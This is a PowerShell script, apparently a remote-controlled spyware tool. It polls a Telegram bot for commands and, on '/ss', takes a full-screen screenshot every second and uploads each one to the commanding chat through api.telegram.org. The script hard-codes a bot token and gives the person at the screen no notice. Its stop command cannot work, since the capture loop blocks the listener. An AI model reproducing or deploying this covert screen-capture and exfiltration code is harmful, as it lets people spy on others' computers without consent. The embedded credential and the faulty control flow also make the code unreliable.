# Telegram Bot Token
$BotToken = "7748489422:AAGrYJ8e0kwARBhxgR1gtf8b8zEKlgoNJQ8"
$BaseUrl = "https://api.telegram.org/bot$BotToken"
$Global:SendScreenshots = $false  # Flag to control screenshot loop

# Function to send messages
Function Send-TelegramMessage {
    param (
        [string]$ChatID,
        [string]$Message
    )

    $SendMessageUrl = "$BaseUrl/sendMessage"
    $Body = @{
        chat_id = $ChatID
        text    = $Message
    }

    try {
        Invoke-RestMethod -Uri $SendMessageUrl -Method Post -ContentType "application/json" -Body ($Body | ConvertTo-Json -Depth 10)
    } catch {
        Write-Error "Error sending message: $_"
    }
}

# Function to take a screenshot (Uses built-in Windows tool)
Function Take-Screenshot {
    param (
        [string]$SavePath
    )

    Add-Type -TypeDefinition @"
        using System;
        using System.Drawing;
        using System.Drawing.Imaging;
        using System.Windows.Forms;
        public class Screenshot {
            public static void Capture(string path) {
                Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(bmp);
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                bmp.Save(path, ImageFormat.Png);
                g.Dispose();
                bmp.Dispose();
            }
        }
"@ -Language CSharp

    [Screenshot]::Capture($SavePath)
}

# Function to send a photo
Function Send-Photo {
    param (
        [string]$ChatID,
        [string]$FilePath
    )

    $SendPhotoUrl = "$BaseUrl/sendPhoto"
    $Form = @{
        chat_id = $ChatID
        photo   = Get-Item $FilePath
    }

    try {
        Invoke-RestMethod -Uri $SendPhotoUrl -Method Post -ContentType "multipart/form-data" -Form $Form
    } catch {
        Write-Error "Error sending photo: $_"
    }
}

# Function to continuously send screenshots
Function Start-ScreenshotLoop {
    param ([string]$ChatID)

    $Global:SendScreenshots = $true
    while ($Global:SendScreenshots) {
        $ScreenshotPath = "$env:TEMP\screenshot.png"
        Take-Screenshot -SavePath $ScreenshotPath
        Send-Photo -ChatID $ChatID -FilePath $ScreenshotPath
        Start-Sleep -Seconds 1
    }
}

# Function to listen for bot commands
Function Start-BotListener {
    $Offset = 0

    while ($true) {
        $GetUpdatesUrl = "$BaseUrl/getUpdates?offset=$Offset"
        try {
            $Updates = Invoke-RestMethod -Uri $GetUpdatesUrl -Method Get
            foreach ($Update in $Updates.result) {
                $Offset = $Update.update_id + 1
                if ($Update.message -and $Update.message.text) {
                    $ChatID = $Update.message.chat.id
                    $Text = $Update.message.text.ToLower()

                    if ($Text -eq "/ss") {
                        Send-TelegramMessage -ChatID $ChatID -Message "📸 Sending screenshots every second. Use /stop to stop."
                        Start-ScreenshotLoop -ChatID $ChatID
                    } elseif ($Text -eq "/stop") {
                        $Global:SendScreenshots = $false
                        Send-TelegramMessage -ChatID $ChatID -Message "🚫 Stopped sending screenshots."
                    }
                }
            }
        } catch {
            Write-Error "Error fetching updates: $_"
        }

        Start-Sleep -Seconds 1
    }
}

# Start the bot listener
Start-BotListener
